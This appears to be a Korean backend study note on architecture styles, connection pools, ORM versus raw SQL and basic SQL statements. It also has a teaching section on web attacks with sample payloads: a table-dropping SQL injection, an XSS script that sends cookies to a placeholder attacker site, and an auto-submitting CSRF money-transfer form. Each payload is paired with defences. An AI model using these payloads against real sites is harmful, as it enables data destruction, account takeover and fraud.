- 3계층 아키텍처 이외에 어떤 아키텍처들이 있을까?

  아키텍처 - 코드나 서버를 어떤 덩어리로 나누고, 덩어리끼리 어떻게 연결할지 정한 설계도

  | 아키텍처 | 핵심 아이디어 | 장점 | 단점 |
      | --- | --- | --- | --- |
  | 계층형 (Layered, 3계층 포함) | Controller → Service → Repository처럼 위에서 아래로만 의존 | 구조가 단순해서 이해하기 쉽고 가장 널리 쓰인다 | 비즈니스 로직(Service)이 DB 계층(Repository)에 의존하게 된다 |
  | MVC 패턴 | Model(데이터) / View(화면) / Controller(요청 처리)로 분리 | 화면과 로직을 분리할 수 있다 | 화면을 그리는 구조라 API 서버 전체 구조를 설명하기엔 부족하다 |
  | 헥사고날 (Ports & Adapters) | 도메인을 가운데 두고, DB·웹 같은 외부 기술은 포트(인터페이스)와 어댑터로 연결 | DB나 외부 기술을 바꿔도 도메인 코드는 그대로 둘 수 있고 테스트하기 쉽다 | 인터페이스와 클래스 수가 많아져서 작은 프로젝트에선 과하다 |
  | 클린 아키텍처 / 어니언 | 동심원 구조로, 의존성이 항상 안쪽(도메인) 방향으로만 향하게 한다 | 핵심 로직이 프레임워크에 묶이지 않는다 | 학습 비용이 높고 초기 설계가 복잡하다 |
  | 모놀리식 | 모든 기능을 하나의 서버(애플리케이션)로 배포 | 개발과 배포가 단순하고 초기에 빠르다 | 규모가 커지면 작은 수정에도 전체를 다시 배포해야 한다 |
  | MSA (마이크로서비스) | 기능별(회원, 주문, 결제 등)로 서버를 나눠 독립적으로 배포 | 서비스별로 독립 배포와 확장이 가능하다 | 서비스 간 통신, 분산 트랜잭션, 운영이 복잡하다 |
  | 이벤트 기반 (Event-Driven) | "주문 완료" 같은 이벤트를 발행하면 관심 있는 서비스가 구독해서 처리 | 서비스 간 결합이 느슨해진다 | 흐름을 추적하고 디버깅하기 어렵다 |

  3계층은 역할을 나누는 가장 기본적인 구조지만, 의존 방향이 Service → Repository → DB 라서 핵심 로직이 DB 접근 코드에 기대게 된다.

  헥사고날·클린 아키텍처는 도메인이 인터페이스를 먼저 정하고 DB 코드가 이를 구현하게 해서, DB를 다루는 방식이 바뀌어도 핵심 로직은 고칠 필요가 없는 구조다.

  모놀리식과 MSA는 서버 자체를 어떻게 나눌지의 문제라, 결국 **정답인 아키텍처는 없고 프로젝트 규모와 변경 가능성에 맞게 고르는 것**이 중요하다. 지금처럼 작은 프로젝트에서는 3계층이 가장 적절하다.

- SQL Injection을 포함한 대표적인 웹 보안 공격 기법

  ### SQL Injection

  **사용자가 보낸 값에 SQL 명령어를 섞어서, DB가 그걸 명령어로 실행하게 만드는 공격**

    - 서버 코드가 입력값을 문자열로 이어 붙이는 경우

    ```java
    "INSERT INTO book (title) VALUES ('" + title + "')"
    ```

    - 정상 입력 클린 코드를 보내면, title 자리에 입력값이 끼워져서 DB에는 이런 쿼리가 전달된다.

    ```sql
    INSERT INTO book (title) VALUES ('클린 코드')
    ```

    - 악성 입력 '); DROP TABLE book; --를 보내면, 똑같이 끼워져서 DB에는 이런 쿼리가 전달된다.

    ```sql
    INSERT INTO book (title) VALUES (''); DROP TABLE book; --')
    ```

  입력값 속 ')가 원래 괄호를 먼저 닫아버리고, 뒤에 DROP TABLE book이라는 새 명령어가 붙는다. -- 뒤는 주석이라 무시된다. 결과적으로 **book 테이블이 삭제**된다.

  **방어법: 파라미터 바인딩**

    ```java
    String sql = "INSERT INTO book (title) VALUES (?)";jdbcTemplate.update(sql, title);
    ```

    - 쿼리 모양을 먼저 정해 두고, ? 자리에 들어오는 값은 **무조건 데이터로만** 취급한다.
    - 같은 악성 입력을 보내도 테이블은 삭제되지 않고, 이상한 제목의 책이 한 권 저장될 뿐이다.

  ### XSS (크로스 사이트 스크립팅)

  **게시글이나 댓글에 악성 스크립트(JavaScript 코드)를 심어 두고, 그 글을 본 다른 사용자의 브라우저에서 코드가 실행되게 만드는 공격**

    - 웹페이지는 HTML로 되어 있고, 브라우저는 HTML 안의 script 태그를 보면 그 안의 코드를 실행한다.
    - 로그인하면 브라우저에 쿠키가 저장되고, 이 쿠키가 있으면 사이트는 "로그인된 사용자"로 인정해 준다.

  **공격 흐름**

    1. 공격자가 게시판 댓글에 아래 내용을 작성한다.

    ```html
    <script>fetch("https://공격자사이트.com?cookie=" + document.cookie)</script>
    ```

    1. 서버는 이걸 평범한 댓글로 생각하고 DB에 **그대로 저장**한다.
    2. 다른 사용자가 게시글을 열면, 서버는 댓글을 HTML에 그대로 넣어서 보낸다.
    3. 브라우저는 script 태그를 보고 **사이트가 원래 넣어 둔 코드인 줄 알고 실행**한다.
    4. 사용자의 쿠키가 공격자에게 전달되고, 공격자는 그 쿠키로 **사용자인 척 로그인**할 수 있다.

  **방어법**

    - **이스케이프**: 사용자가 쓴 글을 화면에 보여줄 때 꺾쇠 기호(<, >)를 HTML 특수문자 코드로 바꾼다. 그러면 script 태그가 코드로 실행되지 않고 화면에 글자 그대로 보인다.
    - **HttpOnly 쿠키**: 쿠키에 HttpOnly 설정을 하면 JavaScript로 쿠키를 읽을 수 없어서, 스크립트가 실행되더라도 쿠키를 훔쳐 갈 수 없다.

  ### CSRF (사이트 간 요청 위조)

  **사용자가 로그인된 상태라는 점을 이용해서, 사용자가 모르는 사이에 사용자 이름으로 요청을 보내게 만드는 공격**이다.

    - 브라우저는 어떤 사이트로 요청을 보낼 때, 그 사이트의 쿠키를 **자동으로 같이 보낸다.**
    - 이 요청을 **어느 페이지에서 보냈는지는 상관없이** 쿠키가 붙는다는 점이 문제의 핵심이다.

  **공격 흐름**

    1. 사용자가 은행 사이트에 로그인한다. 브라우저에 은행 쿠키가 저장된다.
    2. 로그아웃하지 않은 채로, 공격자가 보낸 이벤트 링크를 클릭해 공격자 사이트에 들어간다.
    3. 공격자 사이트에는 눈에 안 보이는 송금 요청 폼이 숨어 있고, 페이지가 열리자마자 자동으로 전송된다.

    ```html
    <form action="https://은행.com/transfer" method="POST">  
    <input type="hidden" name="to" value="공격자계좌">  
    <input type="hidden" name="amount" value="1000000"></form>
    <script>document.forms[0].submit();</script>
    ```

    1. 브라우저는 은행으로 가는 요청이니까 **은행 쿠키를 자동으로 붙여서** 보낸다.
    2. 은행 서버는 로그인 쿠키가 정상이니 사용자 본인의 요청이라고 판단하고 **송금을 처리**한다.

  **방어법**

    - **CSRF 토큰**: 진짜 은행 페이지에서만 알 수 있는 랜덤한 값을 요청에 함께 보내게 한다. 공격자 사이트는 이 값을 모르니까 요청이 거부된다.
    - **SameSite 쿠키**: 다른 사이트에서 시작된 요청에는 쿠키를 붙이지 않도록 브라우저에 설정한다.
    - 송금이나 비밀번호 변경처럼 중요한 요청은 비밀번호를 한 번 더 확인한다.

- 커넥션 풀(Connection Pool)이란?

  커넥션 풀 **- 서버와 DB 사이의 연결(커넥션)을 미리 여러 개 만들어 두고, 필요할 때 빌려 쓰고 돌려주는 방식**

  ### 왜 필요한가

    - 서버가 DB에 연결하려면 매번 "연결 요청 → 아이디·비밀번호 확인 → 연결 완료" 과정을 거쳐야 하고, 이게 꽤 오래 걸린다.
    - 요청이 올 때마다 연결하고 끊으면, 정작 쿼리 실행보다 연결하는 데 시간을 더 많이 쓴다.

  ### 동작 순서

    1. 서버가 켜질 때 커넥션을 미리 10개 정도 만들어 둔다.
    2. 요청이 오면 풀에서 커넥션을 하나 빌린다.
    3. 쿼리를 실행한다.
    4. 다 쓰면 연결을 끊지 않고 **풀에 돌려놓는다.**
    5. 10개가 전부 사용 중이면, 다음 요청은 누가 돌려놓을 때까지 기다린다.

  커넥션 풀은 연결을 **재사용**해서 속도를 높이고, 동시에 연결 개수를 제한해서 DB가 과부하되지 않게 막아 준다. 다만 개수를 무작정 늘린다고 빨라지는 건 아니고, 빌려 간 커넥션을 돌려주지 않으면 풀이 바닥나서 서버가 멈출 수 있다.

- Raw SQL vs ORM

  ### Raw SQL

    - **SQL을 직접 문자열로 써서 실행하는 방식**

    ```java
    String sql = "INSERT INTO book (category_id, title, description, is_available) VALUES (?, ?, ?, true)";
    jdbcTemplate.update(sql, body.get("categoryId"), body.get("title"), body.get("description"));
    ```

  ### ORM (Object-Relational Mapping)

    - **자바 객체와 DB 테이블을 자동으로 연결해 주는 도구**. 객체를 저장하라고 하면 ORM이 SQL을 대신 만들어 준다.

    ```java
    Book book = new Book(1L, "클린 코드", "애자일 소프트웨어 장인 정신");
    bookRepository.save(book);  // SQL은 ORM이 알아서 만든다
    ```

  ### 비교

  | 구분 | Raw SQL | ORM |
      | --- | --- | --- |
  | 쿼리 작성 | 개발자가 직접 쓴다 | ORM이 대신 만든다 |
  | 오타 | "titel" 같은 오타를 실행해 봐야 안다 | 코드 작성 단계에서 바로 빨간 줄로 알려준다 |
  | 컬럼이 바뀌면 | 관련 SQL 문자열을 전부 찾아 고쳐야 한다 | 객체 한 곳만 고치면 된다 |
  | 복잡한 쿼리 | 원하는 대로 자유롭게 쓸 수 있다 | 복잡해질수록 표현이 어렵고, 비효율적인 쿼리가 나올 수 있다 |
- INSERT 외에 데이터를 다루는 핵심 SQL 문법

  ### UPDATE: 데이터 수정

    ```sql
    -- 1번 대여 기록을 "지금 반납함"으로 수정
    UPDATE rental
    SET returned_at = NOW()
    WHERE rental_id = 1;
    ```

    - SET: 무엇을 어떻게 바꿀지
    - WHERE: 어떤 행을 바꿀지

  **주의: WHERE를 빼먹으면**

    ```sql
    UPDATE rental
    SET returned_at = NOW();
    ```

    - WHERE가 없으면 "어떤 행을 바꿀지" 조건이 없으니까, DB는 **rental 테이블의 모든 행**을 바꾼다.
    - 1번 대여 기록 하나만 반납 처리하려고 했는데, 아직 책을 빌려 가 있는 사람들의 기록까지 **전부 반납된 것으로** 바뀐다.
    - 한 번 실행되면 원래 값(NULL, 즉 아직 반납 안 함)이 사라져서, 누가 실제로 반납했는지 되돌려 알 수 없다.
    - 이런 실수를 막으려고 MySQL Workbench는 **Safe Update 모드**가 기본으로 켜져 있다. WHERE 없이 UPDATE나 DELETE를 실행하면 에러를 띄우고 실행을 막아 준다.

  ### DELETE: 데이터 삭제

    ```sql
    -- 3번 책 삭제
    DELETE FROM book
    WHERE book_id = 3;
    ```

    - 여기서도 WHERE가 없으면 **모든 책이 삭제**된다.
    - 대여 기록이 있는 책은 FK로 연결되어 있어서 삭제가 거부된다. (자식 데이터가 부모를 가리키고 있기 때문)

  ### 트랜잭션: 여러 쿼리를 한 묶음으로

    - 책을 대여할 때는 두 가지가 **함께** 일어나야 한다.
        1. rental 테이블에 대여 기록 추가
        2. book 테이블의 is_available을 FALSE로 변경
    - 1번만 성공하고 2번이 실패하면, 대여 중인 책이 "대여 가능"으로 남는 문제가 생긴다.
    - 트랜잭션은 이런 쿼리들을 한 묶음으로 만들어서, 전부 성공하면 반영(COMMIT)하고 하나라도 실패하면 전부 취소(ROLLBACK)한다.

    ```sql
    START TRANSACTION;
    INSERT INTO rental (user_id, book_id, rented_at, due_at)
    VALUES (1, 2, NOW(), DATE_ADD(NOW(), INTERVAL 7 DAY));
    UPDATE book SET is_available = FALSE WHERE book_id = 2;
    COMMIT;
    ```
